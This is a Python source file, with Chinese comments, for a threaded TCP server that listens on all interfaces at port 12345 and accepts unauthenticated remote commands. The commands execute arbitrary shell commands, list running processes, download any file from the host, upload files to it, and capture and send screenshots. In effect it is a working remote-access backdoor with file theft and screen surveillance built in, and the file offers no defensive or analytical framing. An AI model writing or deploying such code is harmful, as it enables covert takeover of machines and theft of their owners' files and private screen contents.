import socket
import os
import subprocess
import threading
from queue import Queue
from PIL import ImageGrab

# 线程池大小
THREAD_POOL_SIZE = 10

def handle_client(client_socket, addr):
    print(f"New connection from {addr}")
    try:
        while True:
            data = client_socket.recv(1024).decode('utf-8', 'ignore')
            if not data:
                break  # 客户端关闭了连接

            command = data.split(' ', 1)
            if command[0] == 'shell':
                execute_shell_command(client_socket, command[1])
            elif command[0] == 'w':
                list_processes(client_socket)
            elif command[0] == 'do':
                send_file(client_socket, command[1])
            elif command[0] == 'du':
                receive_file(client_socket, command[1])
            elif command[0] == 'xs':
                take_screenshot(client_socket)
            else:
                client_socket.sendall(b"Unknown command")
    except ConnectionResetError:
        print(f"Client {addr} disconnected")
    except Exception as e:
        print(f"Unexpected error from {addr}: {e}")
    finally:
        client_socket.close()

def execute_shell_command(client_socket, cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        client_socket.sendall(result)
    except subprocess.CalledProcessError as e:
        client_socket.sendall(str(e).encode('utf-8'))

def list_processes(client_socket):
    try:
        result = subprocess.check_output("tasklist", shell=True, stderr=subprocess.STDOUT)
        client_socket.sendall(result)
    except subprocess.CalledProcessError as e:
        client_socket.sendall(str(e).encode('utf-8'))

def send_file(client_socket, file_name):
    try:
        if os.path.isfile(file_name):
            client_socket.sendall(b"Ready to receive file")
            with open(file_name, 'rb') as file:
                while True:
                    data = file.read(1024)
                    if not data:
                        break
                    client_socket.sendall(data)
            print(f"Sent file {file_name} to client")
        else:
            client_socket.sendall(f"File {file_name} not found.".encode('utf-8'))
    except Exception as e:
        client_socket.sendall(str(e).encode('utf-8'))

def receive_file(client_socket, file_name):
    try:
        with open(file_name, 'wb') as file:
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)
        print(f"Received file {file_name} from client")
    except Exception as e:
        client_socket.sendall(str(e).encode('utf-8'))

def take_screenshot(client_socket):
    try:
        screenshot = ImageGrab.grab()
        screenshot.save('screenshot.png')
        with open('screenshot.png', 'rb') as file:
            while True:
                data = file.read(1024)
                if not data:
                    break
                client_socket.sendall(data)
        print(f"Sent screenshot to client")
    except Exception as e:
        client_socket.sendall(str(e).encode('utf-8'))

def worker(q):
    while True:
        client_socket, addr = q.get()
        handle_client(client_socket, addr)
        q.task_done()

def start_server(host, port):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Server listening on {host}:{port}")

    # 创建线程池
    q = Queue()
    for _ in range(THREAD_POOL_SIZE):
        threading.Thread(target=worker, args=(q,), daemon=True).start()

    try:
        while True:
            client_socket, addr = server_socket.accept()
            q.put((client_socket, addr))
    except KeyboardInterrupt:
        print("Server stopped by user")
    finally:
        server_socket.close()

start_server('0.0.0.0', 12345)